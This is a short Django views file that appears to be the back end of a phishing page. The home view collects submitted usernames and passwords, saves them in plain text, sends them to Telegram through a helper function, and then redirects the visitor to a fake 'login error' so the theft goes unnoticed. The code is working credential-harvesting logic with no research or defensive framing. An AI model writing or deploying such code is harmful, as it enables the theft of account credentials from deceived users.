from django.shortcuts import render, redirect
from .models import User
from .telegram import send_user_to_telegram

# Create your views here.
def home(request):
    if request.method == 'POST':
        u = User()
        u.username = request.POST.get('username', '')
        u.password = request.POST.get('password', '')
        u.save()
        send_user_to_telegram(u)
        return redirect('/?login_error=1')
    return render(request, 'home.html')